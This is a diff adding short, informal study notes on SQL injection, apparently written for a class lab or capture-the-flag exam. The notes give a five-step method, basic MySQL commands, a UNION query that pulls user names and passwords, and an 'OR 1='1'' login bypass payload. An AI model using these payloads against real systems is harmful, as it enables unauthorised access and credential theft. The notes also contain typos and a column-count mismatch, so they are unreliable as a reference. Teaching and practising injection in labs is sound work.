@@ -1,0 +1,26 @@
+5 step sql injection:
+- identify vulnerable fields
+- identify # of columns w golden statement
+- edit golden statement
+- craft query
+- get money(points)/pass exam
+
+******https://www.w3schools.com/SQL/sql_syntax.asp SELECT and UNION
+
+all commands end with semicolon
+ex: show databases; show TABLESS from information_schema; show tables from session
+names are case sensitive, commands no
+
+databases contatin tables, tables contains colums, colums contain data that you want
+  mysql
+show colums from session.Tires; select tireid from session.tireid; select tireid,name,size,cost from session.Tires;
+show colums from session.user;
+select tireid,name,size,cost from session.Tires union select id,name,pass from session.user; (needs same amounts of colums)
+
+SELECT id, title FROM movies WHERE id = 6;
+SELECT title, year FROM movies WHERE year <= 2003;
+
+input post mehtod
+url bar get method
+
+SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
